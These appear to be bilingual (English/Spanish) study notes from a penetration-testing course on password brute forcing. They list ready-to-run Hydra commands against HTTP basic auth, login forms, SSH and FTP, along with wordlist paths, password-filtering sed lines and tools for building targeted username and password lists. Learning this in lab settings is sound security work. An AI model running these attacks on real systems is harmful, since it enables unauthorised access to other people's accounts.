# Hydra

| **Command**   | **Description**   |
| --------------|-------------------|
| `hydra -h` | hydra help |
| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - Combined Wordlist |
| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - User/Pass Wordlists |
| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Login Form Brute Force - Static User, Pass Wordlist |
| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH Brute Force - User/Pass Wordlists |
| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1` | FTP Brute Force - Static User, Pass Wordlist |

# Wordlists

| **Command**   | **Description**   |
| --------------|-------------------|
| `/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | Default Passwords Wordlist |
| `/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt` | Common Passwords Wordlist |
| `/opt/useful/SecLists/Usernames/Names/names.txt` | Common Names Wordlist |

# Misc

| **Command**   | **Description**   |
| --------------|-------------------|
| `cupp -i` | Creating Custom Password Wordlist |
| `sed -ri '/^.{,7}$/d' william.txt` | Remove Passwords Shorter Than 8 |
| ```sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt``` | Remove Passwords With No Special Chars |
| `sed -ri '/[0-9]+/!d' william.txt` | Remove Passwords With No Numbers |
| `./username-anarchy Bill Gates > bill.txt` | Generate Usernames List |
| `ssh b.gates@SERVER_IP -p PORT` | SSH to Server |
| `ftp 127.0.0.1` | FTP to Server |
| `su - user` | Switch to User |
## Introduction to Brute Forcing

```shell
# Programas que se pueden usar:
-Ncrack
-wfuzz
-medusa
-patator
-hydra
```

## Password Attacks

```shell
# Brute Force Attack: No usa listas, sino que intenta adivinar los caracteres, pero esto esta obsoleto porque tarda mucho. Por lo tanto, hemos de usar diccionarios de contraseñas. 

# Metodos de ataque brute-force:
- Online Brute force attack: Atacar aplicaciones mediante el network (HTTP, HTTPS, etc).
- Offline: Romper el hash de una contraseña.
- Reverse brute force attack: Sabiendo la password, intentamos adivinar el usuario. 
- Hybrid Brute force attack: Usando una lista de contraseñas personalizadas creadas a partir de datos sobre el usuario/servicio.
```

## Default Passwords

```shell
# Uso de hydra para cuando no sabemos ni usuario ni password
hydra -C /usr/share/wordlists/defaultcreds.txt 134.209.186.13 -s 32629 http-get /
```

## Web brute force with hydra

```shell
# Primero tenemos que ver si la pagina usa GET o POST:
# GET: Si algo de nuestro input se ve reflejado en la URL de la pagina.
# POST: Sino, es por POST.

# Segundo: Ver si la pagina es HTTP o HTTPS. Esto se ve en la URL.

# Parametros a usar teniendo GET/POST y HTTP/HTTPS:
# URL PATH, POST Parameter, failed/success login string:
# /login.php:[user parameter]=^USER^&[password parameter]=^PASS^:[FAIL/SUCCESS]=[success/failed string]. 
# Si no sabemos que poner de string, podemos probar como poner el panel de log de admin, cosas de la URL, cosas del source, como por ejemplo "form name=login" 

# Otra manera de ver si es GET/POST entramos al network de la pagina (ctrl+shift+E), meter cualquier cosa y que retorna, si get o post:

```
![[Pasted image 20221119232331.png]]![[Pasted image 20221119232457.png]]

```shell
# Una vez sabemos el username, podemos usar este comando pa sacar la password:
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 178.62.84.158 -s 31236 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

```shell
# Para bruteforcear ssh:
hydra -l "username" -P "wordlist" -u -f ssh://"ip":"puerto" -t 4
# Para FTP:
hydra -l "username" -P "wordlist" ftp://"ip"
```